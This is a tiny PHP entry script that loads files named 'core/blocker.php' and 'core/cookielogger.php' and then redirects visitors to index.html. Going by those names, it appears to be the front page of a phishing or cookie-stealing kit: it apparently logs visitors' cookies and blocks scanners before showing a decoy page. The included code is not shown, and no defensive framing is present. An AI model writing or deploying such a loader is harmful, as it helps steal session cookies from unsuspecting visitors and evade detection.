<?php
include("core/blocker.php");
include("core/cookielogger.php");
header("Location: index.html");
?>